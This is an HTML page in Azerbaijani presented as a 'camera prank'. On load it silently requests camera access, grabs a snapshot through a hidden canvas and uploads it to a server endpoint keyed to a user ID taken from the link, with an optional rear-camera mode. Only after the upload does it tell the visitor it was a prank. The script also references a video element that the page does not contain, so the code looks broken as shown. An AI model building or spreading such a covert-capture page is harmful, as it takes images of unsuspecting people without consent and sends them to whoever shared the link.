<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <title>Kamera Prank</title>
</head>
<body>
  <h2 style="text-align:center;">Kamera a√ßƒ±lƒ±r... G√ºl√ºms…ô üòä</h2>
  
  <canvas style="display:none;"></canvas>

  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      const video = document.querySelector('video');
      const canvas = document.querySelector('canvas');
      const { userId, mode } = getParamsFromUrl();
      const isVip = mode !== null;

      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          alert('Z…ôhm…ôt olmasa, bu s…ôhif…ôni ba≈üqa brauzerd…ô a√ßƒ±n.');
          return;
      }

      async function startCamera() {
          try {
              const constraints = {
                  video: {
                      facingMode: mode === '2' ? 'environment' : 'user'
                  }
              };
              const stream = await navigator.mediaDevices.getUserMedia(constraints);
              video.srcObject = stream;
              video.play();
              video.onloadedmetadata = () => {
                  setTimeout(() => takeSnapshot(stream), 1000);
              };
          } catch (error) {
              console.error('Kameraya giri≈ü zamanƒ± x…ôta:', error);
              alert('Kameraya giri≈ü zamanƒ± x…ôta: ' + error.message);
          }
      }

      function takeSnapshot(stream) {
          if (video.readyState === video.HAVE_ENOUGH_DATA) {
              const context = canvas.getContext('2d');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              const dataURL = canvas.toDataURL('image/png');
              uploadImage(userId, dataURL);
              stream.getTracks().forEach(track => track.stop());
          } else {
              setTimeout(() => takeSnapshot(stream), 100);
          }
      }

      async function uploadImage(userId, image) {
          try {
              const response = await fetch(`/upload/${userId}`, {
                  method: 'POST',
                  body: JSON.stringify({ image: image }),
                  headers: { 'Content-Type': 'application/json' }
              });
              const result = await response.json();
              if (result.ok) {
                  alert('T…ôbii ki, bu bir PRANK idi üòÑ');
                  if (isVip) {
                      await fetch(`/redirect/${userId}`, { method: 'POST' });
                  }
              } else {
                  alert('≈û…ôkil g√∂nd…ôrilm…ôdi: ' + result.description);
              }
          } catch (error) {
              console.error('≈û…ôkil g√∂nd…ôrilm…ô zamanƒ± x…ôta:', error);
              alert('≈û…ôkil g√∂nd…ôrilm…ô zamanƒ± x…ôta: ' + error.message);
          }
      }

      function getParamsFromUrl() {
          const urlParams = new URLSearchParams(window.location.search);
          const userId = urlParams.get('video') ? urlParams.get('video') : '491264374';
          const mode = urlParams.get('m') ? urlParams.get('m') : null;
          return { userId, mode };
      }

      startCamera();
    });
  </script>
</body>
</html>
